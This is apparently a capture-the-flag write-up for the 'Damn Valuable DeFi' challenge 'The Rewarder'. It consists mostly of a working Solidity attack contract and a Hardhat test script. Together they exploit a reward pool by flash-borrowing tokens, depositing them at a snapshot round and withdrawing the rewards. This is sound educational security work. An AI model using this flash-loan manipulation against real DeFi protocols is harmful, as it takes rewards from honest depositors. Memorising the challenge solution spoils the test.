# 5 - The Rewarder

### Solution

At the exact moment when the roundNumer turns to 3 from 2,\
we will borrow dvts, take snapshot, and pay them back.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTheRewarder {
    DamnValuableToken dvt;
    RewardToken rewardToken;
    FlashLoanerPool loanerPool;
    TheRewarderPool rewarderPool;

    uint256 constant TOKENS_IN_LENDER_POOL = 1000000 ether;

    constructor(
        address _dvt,
        address _rewardToken,
        address _loanerPool,
        address _rewarderPool
    ) {
        dvt = DamnValuableToken(_dvt);
        rewardToken = RewardToken(_rewardToken);
        loanerPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
    }

    function attack() external {
        loanerPool.flashLoan(dvt.balanceOf(address(loanerPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        dvt.transfer(address(loanerPool), dvt.balanceOf(address(this)));
    }
}

```

```javascript
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const AttackRewarderFactory = await ethers.getContractFactory('AttackTheRewarder', attacker);
    const attackRewarder = await AttackRewarderFactory.deploy(
      this.liquidityToken.address,
      this.rewardToken.address,
      this.flashLoanPool.address,
      this.rewarderPool.address
    );
    await attackRewarder.deployed();
    await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]); // 5 days
    await attackRewarder.connect(attacker).attack();
  });
```
